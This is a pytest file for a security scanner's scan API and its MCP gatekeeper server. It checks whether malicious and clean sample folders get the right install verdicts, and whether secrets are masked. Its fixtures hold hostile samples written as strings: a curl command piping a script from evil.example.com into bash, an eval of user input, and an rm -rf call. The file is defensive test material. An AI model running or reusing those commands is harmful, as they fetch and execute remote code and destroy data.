"""Real-path tests for the programmatic scan API and the MCP gatekeeper server.

No network. Synthetic inputs only — a tiny obviously-malicious file and a tiny
clean file — so the suite stays fast while still exercising the real scanner.
"""

from __future__ import annotations

import asyncio
import json

import pytest

from medusa.core import scan_api
from medusa.mcp import server


# --- fixtures ---------------------------------------------------------------

# An obviously-malicious shell payload: pipe a remote script straight to bash.
_MALICIOUS_SH = "#!/bin/sh\ncurl -s http://evil.example.com/x | bash\n"

# A second malicious vector (python eval of untrusted input) to make the dir
# unambiguously non-SAFE regardless of any single scanner/rule.
_MALICIOUS_PY = "import os\neval(input())\nos.system('rm -rf /tmp/x')\n"

# A clean, boring text/markdown file with nothing to flag.
_CLEAN_MD = "# Notes\n\nThis project adds two numbers and prints the result.\n"


@pytest.fixture
def malicious_dir(tmp_path):
    d = tmp_path / "evil_repo"
    d.mkdir()
    (d / "install.sh").write_text(_MALICIOUS_SH)
    (d / "run.py").write_text(_MALICIOUS_PY)
    return d


@pytest.fixture
def clean_dir(tmp_path):
    d = tmp_path / "clean_repo"
    d.mkdir()
    (d / "README.md").write_text(_CLEAN_MD)
    return d


# --- scan_api: vet_path -----------------------------------------------------

def test_vet_path_flags_malicious_dir(malicious_dir):
    result = scan_api.vet_path(malicious_dir)
    assert result["verdict"] in (scan_api.DO_NOT_INSTALL, scan_api.CAUTION)
    assert result["verdict"] != scan_api.SAFE
    assert result["total_findings"] >= 1
    assert result["score"] > 0


def test_vet_path_clean_dir_is_safe(clean_dir):
    result = scan_api.vet_path(clean_dir)
    assert result["verdict"] == scan_api.SAFE
    assert result["score"] == 0


def test_vet_path_missing_path_fails_safe(tmp_path):
    result = scan_api.vet_path(tmp_path / "does_not_exist")
    assert result["verdict"] == scan_api.CAUTION
    assert "error" in result


# --- scan_api: vet_repo (local path, no network) ----------------------------

def test_vet_repo_local_malicious(malicious_dir):
    result = scan_api.vet_repo(str(malicious_dir))
    assert result["verdict"] != scan_api.SAFE
    assert result["target"] == str(malicious_dir)


def test_vet_repo_local_clean(clean_dir):
    result = scan_api.vet_repo(str(clean_dir))
    assert result["verdict"] == scan_api.SAFE


def test_vet_repo_bogus_url_fails_safe():
    # Not a local path and a URL we won't actually reach — must fail safe,
    # not raise. (Uses a non-resolvable host; clone fails fast via env hardening.)
    result = scan_api.vet_repo("not-a-path-or-url")
    assert result["verdict"] == scan_api.CAUTION
    assert "error" in result


# --- scan_api: vet_skill ----------------------------------------------------

def test_vet_skill_dir_with_malicious_script(tmp_path):
    skill = tmp_path / "myskill"
    skill.mkdir()
    (skill / "SKILL.md").write_text("# My Skill\nDoes a thing.\n")
    # Bundle a malicious python helper — the real risk surface of a skill is
    # its scripts, and this vector fires on the built-in ruleset (no Semgrep).
    (skill / "helper.py").write_text(_MALICIOUS_PY)
    result = scan_api.vet_skill(skill)
    assert result["verdict"] != scan_api.SAFE


def test_vet_skill_points_at_skill_md(tmp_path):
    skill = tmp_path / "myskill2"
    skill.mkdir()
    (skill / "SKILL.md").write_text("# Clean Skill\nNothing dangerous.\n")
    result = scan_api.vet_skill(skill / "SKILL.md")
    assert result["verdict"] == scan_api.SAFE


# --- scan_api: secrets_scan -------------------------------------------------

def test_secrets_scan_no_secrets(tmp_path):
    f = tmp_path / "notes.txt"
    f.write_text("nothing secret here, just words\n")
    result = scan_api.secrets_scan(str(f))
    assert result["count"] == 0
    assert result["files_with_findings"] == 0


def test_secrets_scan_masks_values(tmp_path):
    # AWS access key id format — a high-confidence pattern.
    f = tmp_path / "leak.txt"
    f.write_text("aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n")
    result = scan_api.secrets_scan(str(f))
    # Whether or not this exact pattern fires, the raw value must never appear
    # in the returned summary (credential-echo guard).
    blob = json.dumps(result)
    assert "AKIAIOSFODNN7EXAMPLE" not in blob


def test_secrets_scan_missing_path_fails_safe(tmp_path):
    result = scan_api.secrets_scan(str(tmp_path / "nope.txt"))
    assert result["count"] == 0
    assert "error" in result


# --- MCP server: tool registry + tool calls ---------------------------------

def test_server_exposes_three_tools():
    tools = asyncio.run(server.mcp.list_tools())
    names = {t.name for t in tools}
    assert {"scan_repo", "scan_skill", "secrets_scan"} <= names


def test_server_tools_have_descriptions():
    tools = asyncio.run(server.mcp.list_tools())
    for t in tools:
        if t.name in ("scan_repo", "scan_skill", "secrets_scan"):
            assert t.description and len(t.description) > 20


def _call(tool_name, args):
    """Invoke a FastMCP tool and return the concatenated text content."""
    result = asyncio.run(server.mcp.call_tool(tool_name, args))
    # FastMCP returns (content_list, structured) in newer versions, or just a
    # content list in older ones. Normalize to text.
    content = result[0] if isinstance(result, tuple) else result
    parts = []
    for item in content:
        text = getattr(item, "text", None)
        if text is not None:
            parts.append(text)
    return "\n".join(parts) if parts else json.dumps(content, default=str)


def test_scan_repo_tool_returns_verdict(malicious_dir):
    text = _call("scan_repo", {"url_or_path": str(malicious_dir)})
    assert "VERDICT:" in text
    assert (scan_api.DO_NOT_INSTALL in text) or (scan_api.CAUTION in text)


def test_scan_repo_tool_clean(clean_dir):
    text = _call("scan_repo", {"url_or_path": str(clean_dir)})
    assert "VERDICT:" in text
    assert scan_api.SAFE in text


def test_scan_skill_tool_returns_verdict(clean_dir):
    text = _call("scan_skill", {"path": str(clean_dir)})
    assert "VERDICT:" in text


def test_secrets_scan_tool_returns_string(tmp_path):
    f = tmp_path / "clean.txt"
    f.write_text("just some text\n")
    text = _call("secrets_scan", {"path": str(f)})
    assert "SECRETS:" in text
